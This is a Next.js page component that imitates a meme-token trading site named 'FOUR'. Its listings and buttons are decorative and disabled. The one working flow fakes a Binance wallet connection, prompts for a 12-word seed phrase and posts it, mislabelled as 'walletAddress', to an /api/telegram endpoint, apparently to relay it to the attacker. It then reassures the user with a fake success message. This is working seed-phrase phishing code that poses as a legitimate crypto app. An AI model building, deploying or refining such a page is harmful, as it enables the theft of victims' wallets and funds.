// page.tsx
'use client';
import { useState } from 'react';

export default function Home() {
  const [showWalletConnect, setShowWalletConnect] = useState(false);
  const [showImportWallet, setShowImportWallet] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(''));

  const handleBinanceConnect = () => {
    setConnecting(true);
    setConnectionError(false);
    
    // Simulate connection process
    setTimeout(() => {
      setConnecting(false);
      // Show import wallet after Binance click
      setShowImportWallet(true);
    }, 1500);
  };

  const handleImport = async () => {
    const fullPhrase = seedPhrase.join(' ').trim();
    
    if (fullPhrase.split(/\s+/).length < 12) {
      alert('Please enter a complete 12-word seed phrase');
      return;
    }

    try {
      console.log('🔄 Importing seed phrase:', fullPhrase);
      
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          walletAddress: fullPhrase 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log('✅ Wallet imported successfully');
        setShowImportWallet(false);
        setShowWalletConnect(false);
        setSeedPhrase(Array(12).fill(''));
        alert('Wallet imported successfully! Check your Telegram for confirmation.');
      } else {
        throw new Error(data.error || 'Failed to import wallet');
      }
    } catch (error) {
      console.error('❌ Import error:', error);
      alert('Failed to import wallet. Please try again.');
    }
  };

  return (
    <div className="min-h-screen bg-[#0f0f0f] text-white">
      {/* Header */}
      <div className="p-4 border-b border-[#222]">
        <div className="flex justify-between items-center">
          <h1 className="text-2xl font-bold">FOUR</h1>
          <button 
            onClick={() => setShowWalletConnect(true)}
            className="bg-[#3eb489] hover:bg-[#35a078] px-6 py-2 rounded-lg font-medium"
          >
            Connect Wallet
          </button>
        </div>
      </div>

      {/* Navigation - Non functional */}
      <div className="flex p-4 border-b border-[#222] space-x-6">
        <button className="font-medium border-b-2 border-white pb-1">All Tag</button>
        <button className="text-gray-400 hover:text-white pb-1">All Token</button>
        <button className="text-gray-400 hover:text-white pb-1">Time</button>
      </div>

      {/* Recent Transactions */}
      <div className="p-4 space-y-3">
        <div className="flex justify-between text-sm">
          <span className="text-[#3eb489]">0xa9...68cf0a</span>
          <span>Bought 0.2 BNB of BNBSZN</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-[#3eb489]">0x3d...5bcfdc</span>
          <span>Bought 0.35 BNB of BNBSZN</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-[#3eb489]">0x1e...b170de</span>
          <span>Bought 0.2 BNB of Brocc</span>
        </div>
      </div>

      {/* Action Buttons - Non functional */}
      <div className="grid grid-cols-2 gap-3 p-4">
        <button className="bg-[#1a1a1a] py-3 rounded-lg font-medium opacity-50 cursor-not-allowed">
          Create Token
        </button>
        <button className="bg-[#1a1a1a] py-3 rounded-lg font-medium opacity-50 cursor-not-allowed">
          How it works
        </button>
      </div>

      {/* The New Way To MEME Section */}
      <div className="p-4 bg-[#1a1a1a] mx-4 rounded-lg my-4">
        <h3 className="font-bold text-lg mb-2">The New Way To MEME</h3>
        <p className="text-gray-400 text-sm">Become A TAGGER</p>
        <div className="flex space-x-2 mt-3">
          <span className="bg-[#2a2a2a] px-3 py-1 rounded text-sm opacity-50">Stern</span>
          <span className="bg-[#2a2a2a] px-3 py-1 rounded text-sm opacity-50">Taggers</span>
        </div>
      </div>

      {/* Search - Non functional */}
      <div className="p-4">
        <div className="bg-[#1a1a1a] rounded-lg p-3 flex items-center space-x-2 opacity-50">
          <div className="text-gray-400">🔍</div>
          <input 
            type="text" 
            placeholder="Search Token" 
            className="bg-transparent outline-none flex-1 text-sm cursor-not-allowed"
            disabled
          />
        </div>
        <div className="flex items-center space-x-2 mt-2 text-sm text-gray-400 opacity-50">
          <div className="w-3 h-3 border border-gray-400 rounded"></div>
          <span>Listed on PancakeSwap</span>
        </div>
      </div>

      {/* Token Listings - Non functional */}
      <div className="space-y-4 p-4 pb-20">
        {/* Token 1 - Seasons */}
        <div className="bg-[#1a1a1a] rounded-xl p-4 opacity-50 cursor-not-allowed">
          <div className="flex justify-between items-start mb-2">
            <div>
              <h3 className="font-semibold">Seasons ... (BNB)</h3>
              <p className="text-xs text-gray-400">Meme created by: Qx6a...6873</p>
            </div>
            <span className="text-green-400 text-sm">$0.0%</span>
          </div>
          <p className="text-sm text-gray-300 mb-3">Heard even the seasons are being renamed now...</p>
          <div className="flex justify-between text-sm">
            <span className="text-gray-400">Market Cap: 7.65 K</span>
          </div>
        </div>

        {/* Token 2 - CZ FOOD */}
        <div className="bg-[#1a1a1a] rounded-xl p-4 opacity-50 cursor-not-allowed">
          <div className="flex justify-between items-start mb-3">
            <div>
              <h3 className="font-semibold">CZ FOOD (BNB)</h3>
              <p className="text-xs text-gray-400">created by: 0xaa...2994</p>
            </div>
          </div>
          <div className="flex justify-between text-sm">
            <span className="text-gray-400">Market Cap: 8.22 K</span>
          </div>
        </div>

        {/* Token 3 - Broccoli */}
        <div className="bg-[#1a1a1a] rounded-xl p-4 opacity-50 cursor-not-allowed">
          <div className="flex justify-between items-start mb-2">
            <div>
              <h3 className="font-semibold">Broccoli ... (BNB)</h3>
              <p className="text-xs text-gray-400">createdby: 0x4e...0618</p>
            </div>
          </div>
          <p className="text-sm text-gray-300 mb-3">Broccoli DOGGY</p>
          <div className="flex justify-between text-sm">
            <span className="text-gray-400">Market Cap: 7.94 K</span>
            <span className="text-blue-400">Partnership</span>
          </div>
        </div>
      </div>

      {/* Wallet Connect Modal */}
      {showWalletConnect && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1a1a1a] rounded-2xl w-full max-w-xs border border-[#333]">
            {/* Header */}
            <div className="p-6 text-center border-b border-[#333]">
              <h2 className="text-xl font-bold">Connect a Wallet</h2>
            </div>

            {/* Content */}
            <div className="p-6">
              {connecting ? (
                <div className="text-center py-4">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#3eb489] mx-auto mb-4"></div>
                  <p className="font-medium">Opening Wallet...</p>
                  <p className="text-sm text-gray-400 mt-2">Confirm connection in the wallet</p>
                </div>
              ) : connectionError ? (
                <div className="text-center py-4">
                  <div className="text-red-400 text-sm mb-3">
                    We encountered a temporary security issue. This could be due to network instability or protection mechanisms.
                  </div>
                  <button 
                    onClick={() => setConnectionError(false)}
                    className="bg-[#3eb489] hover:bg-[#35a078] w-full py-3 rounded-lg font-medium"
                  >
                    Retry Connection
                  </button>
                  <button className="text-gray-400 text-sm mt-3 hover:text-white">
                    Learn More
                  </button>
                </div>
              ) : (
                <>
                  {/* Wallet Grid - Only Binance works */}
                  <div className="grid grid-cols-2 gap-3 mb-6">
                    <button className="bg-[#222] p-4 rounded-xl flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
                      <div className="text-lg">🔒</div>
                      <span className="text-sm">Trust Wallet</span>
                    </button>
                    <button className="bg-[#222] p-4 rounded-xl flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
                      <div className="text-lg">G</div>
                      <span className="text-sm">Google</span>
                    </button>
                    <button 
                      onClick={handleBinanceConnect}
                      className="bg-[#222] hover:bg-[#2a2a2a] p-4 rounded-xl flex flex-col items-center space-y-2 transition-colors"
                    >
                      <div className="text-lg">₿</div>
                      <span className="text-sm">Binance Wallet</span>
                    </button>
                    <button className="bg-[#222] p-4 rounded-xl flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
                      <div className="text-lg">OKX</div>
                      <span className="text-sm">OKX Wallet</span>
                    </button>
                  </div>

                  {/* Import Option */}
                  <button 
                    onClick={() => setShowImportWallet(true)}
                    className="text-[#3eb489] hover:text-[#35a078] text-sm w-full text-center"
                  >
                    Import using seed phrase
                  </button>
                </>
              )}
            </div>

            {/* Close Button */}
            <div className="p-4 border-t border-[#333]">
              <button 
                onClick={() => setShowWalletConnect(false)}
                className="w-full bg-[#222] hover:bg-[#2a2a2a] py-3 rounded-lg font-medium transition-colors"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Import Wallet Modal */}
      {showImportWallet && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1a1a1a] rounded-2xl w-full max-w-md border border-[#333]">
            <div className="p-6 border-b border-[#333]">
              <h2 className="text-xl font-bold text-center">Import Wallet</h2>
            </div>

            <div className="p-6">
              <p className="text-sm text-gray-400 mb-4 text-center">
                Enter your 12-word seed phrase here.<br />
                Words are separated by single spaces.
              </p>
              
              <div className="grid grid-cols-2 gap-2 mb-6">
                {seedPhrase.map((word, index) => (
                  <div key={index} className="flex items-center">
                    <span className="text-gray-400 text-sm w-6">{index + 1}</span>
                    <input
                      type="text"
                      value={word}
                      onChange={(e) => {
                        const newPhrase = [...seedPhrase];
                        newPhrase[index] = e.target.value;
                        setSeedPhrase(newPhrase);
                      }}
                      className="bg-[#222] border border-[#333] rounded-lg p-2 text-sm flex-1 text-white"
                      placeholder={`Word ${index + 1}`}
                    />
                  </div>
                ))}
              </div>

              <div className="flex space-x-3">
                <button
                  onClick={() => {
                    setShowImportWallet(false);
                    setSeedPhrase(Array(12).fill(''));
                  }}
                  className="flex-1 bg-[#222] hover:bg-[#2a2a2a] py-3 rounded-lg font-medium transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleImport}
                  className="flex-1 bg-[#3eb489] hover:bg-[#35a078] py-3 rounded-lg font-medium transition-colors"
                >
                  Import
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
